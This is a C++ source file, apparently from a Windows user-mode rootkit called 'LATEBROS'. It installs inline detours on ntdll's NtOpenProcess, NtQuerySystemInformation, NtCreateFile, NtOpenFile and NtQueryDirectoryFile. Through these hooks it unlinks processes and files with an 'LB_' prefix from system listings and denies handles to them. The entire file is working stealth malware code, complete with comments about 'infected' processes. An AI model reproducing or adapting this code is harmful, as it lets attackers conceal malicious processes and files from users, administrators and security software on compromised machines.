#include "stdafx.h"
#include "detour.hpp"
#include <fstream>
#define ROOTKIT_PREFIX L"LB_"

/*
 * Function: ntdll!NtOpenProcess
 * Purpose: Disguise and protect any LATEBROS process by preventing client-id/process-id bruteforcing
 *
 */
typedef NTSTATUS(NTAPI *NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, _CLIENT_ID* ClientId);
extern "C" char __declspec(dllexport) ntop_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, _CLIENT_ID* client_id)
{
	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));

	// RESTORE
	detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));

	// CALL
	reinterpret_cast<NtOpenProcess_t>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);

	// REHOOK
	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));

	wchar_t name_buffer[MAX_PATH] = {};
	if (GetModuleBaseNameW(*out_handle, nullptr, name_buffer, MAX_PATH))
	{
		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
		std::wstring name = name_buffer;
		if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
		{
			CloseHandle(*out_handle);		// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
			*out_handle = 0;				// ERASE PASSED HANLDE
			return ERROR_INVALID_PARAMETER; // RETURN INVALID CLIENT_ID
		}
	}

	return STATUS_SUCCESS; // SUCCESS
}


/*
 * Function: ntdll!NtQuerySystemInformation
 * Purpose: Disguise any LATEBROS process by removing its respective process entry from the process list
 *
 */
typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
extern "C" char __declspec(dllexport) qsi_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS system_information_class, PVOID system_information, ULONG system_information_length, PULONG return_length)
{
	// PREVENT BRUTEFORCE
	if (system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x58)/*SystemProcessIdInformation*/)
	{
		auto process_id = *reinterpret_cast<uint64_t*>(system_information);

		// REMOVE HOOKS IN CASE PROCESS ID IS PROTECTED
		auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));

		// RESTORE
		detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));

		// CALL
		auto handle = OpenProcess(PROCESS_ALL_ACCESS, false, static_cast<DWORD>(process_id));

		// REHOOK
		detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));

		wchar_t name_buffer[MAX_PATH] = {};
		if (handle && GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH))
		{
			// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
			std::wstring name = name_buffer;
			if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
				return STATUS_INVALID_CID; // RETURN INVALID CLIENT_ID
		}

		CloseHandle(handle); // CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
	}

	auto function_pointer = reinterpret_cast<uintptr_t>(NtQuerySystemInformation);

	// RESTORE
	detour::remove_detour(function_pointer, qsi_og, sizeof(qsi_og));

	// CALL
	auto result = NtQuerySystemInformation(system_information_class, system_information, system_information_length, return_length);

	// REHOOK
	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(qsi));

	if (!NT_SUCCESS(result))
		return result;

	// HIDE PROCESSES
	if (system_information_class == SystemProcessInformation
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x35)/*SystemSessionProcessInformation*/
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x39)/*SystemExtendedProcessInformation*/
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x94)/*SystemFullProcessInformation*/)
	{
		auto entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(system_information);
		auto previous_entry = entry;

		while (entry->NextEntryOffset)
		{
			if (entry->ImageName.Buffer)
			{
				// SKIP PROTECTED ENTRIES
				std::wstring name = entry->ImageName.Buffer;
				if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
				{
					previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
					ZeroMemory(entry, entry->NextEntryOffset);					// CLEAR OUR ENTRY, WHY NOT?
				}
			}


			previous_entry = entry;
			entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(reinterpret_cast<uintptr_t>(entry) + entry->NextEntryOffset);
		}
	}

	return result;
}

/*
* Function: ntdll!NtCreateFile
* Purpose: Protect any LATEBROS files by preventing file handles to be opened
*
*/
extern "C" char __declspec(dllexport) ntcr_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntcr(
	PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block, 
	PLARGE_INTEGER allocation_size, ULONG file_attributes, ULONG share_access, ULONG create_disposition,
	ULONG create_options, PVOID ea_buffer, ULONG ea_length)
{
	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
	{
		std::wstring file_name = object_attributes->ObjectName->Buffer;

		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
			return STATUS_NOT_FOUND;
	}

	auto function_pointer = reinterpret_cast<uintptr_t>(NtCreateFile);

	// RESTORE
	detour::remove_detour(function_pointer, ntcr_og, sizeof(ntcr_og));

	// CALL
	auto result = NtCreateFile(file_handle, desired_access, object_attributes, io_status_block, allocation_size, file_attributes, share_access, create_disposition,	create_options, ea_buffer, ea_length);

	// REHOOK
	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntcr));

	return result;
}

/*
* Function: ntdll!NtOpenFile
* Purpose: Protect any LATEBROS files by preventing file handles to be opened
*
*/
extern "C" char __declspec(dllexport) ntopf_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntopf(PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block, ULONG share_access, ULONG open_options)
{
	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
	{
		std::wstring file_name = object_attributes->ObjectName->Buffer;

		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
			return STATUS_NOT_FOUND;
	}

	auto function_pointer = reinterpret_cast<uintptr_t>(NtOpenFile);

	// RESTORE
	detour::remove_detour(function_pointer, ntopf_og, sizeof(ntopf_og));

	// CALL
	auto result = NtOpenFile(file_handle, desired_access, object_attributes, io_status_block, share_access, open_options);

	// REHOOK
	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntopf));

	return result;
}

/*
* Function: ntdll!NtQueryDirectoryFile
* Purpose: Hide any LATEBROS files from directory enumeration
*
*/
// UNDOCUMENTED STRUCT, HAD TO DO IT MYSELF
struct FILE_OLE_DIR_INFORMATION {
	uint32_t	next_entry_offset;	// 0x00 (0x04)
	char		pad_0[0x64];		// 0x04 (0x64)
	wchar_t		file_name[1];		// 0x68
};
typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_t)(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan);
extern "C" char __declspec(dllexport) ntqdf_og[0xF] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan)
{
	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryDirectoryFile"));

	// RESTORE
	detour::remove_detour(function_pointer, ntqdf_og, sizeof(ntqdf_og));

	// CALL	
	auto result = reinterpret_cast<NtQueryDirectoryFile_t>(function_pointer)(file_handle, event, apc_routine, apc_context, io_status_block, file_information, length, file_information_class, return_single_entry, file_name, restart_scan);

	// REHOOK
	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntqdf));

	// HIDE FILES / DIRECTORIES
	if (result == STATUS_SUCCESS)
	{
		// EXPLORER CALLS NTQUERYDIRECTORYFILE WITH CLASS 37, STRUCT WASN'T DOCUMENTED NOR ON ANY NT BLOGS 
		// SO I HAD TO FIND THE IMPORTANT MEMBERS MYSELF
		if (file_information_class == 37/*FileOleDirectoryInformation*/)
		{
			auto current_entry = reinterpret_cast<FILE_OLE_DIR_INFORMATION*>(file_information);
			auto previous_entry = current_entry;

			while (current_entry->next_entry_offset)
			{
				std::wstring file_name = current_entry->file_name;
				if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
				{
					previous_entry->next_entry_offset += current_entry->next_entry_offset;	// SKIP
				}

				previous_entry = current_entry;
				current_entry = reinterpret_cast<FILE_OLE_DIR_INFORMATION*>(reinterpret_cast<uintptr_t>(current_entry) + current_entry->next_entry_offset);
			}
		}
	}

	return result;
}

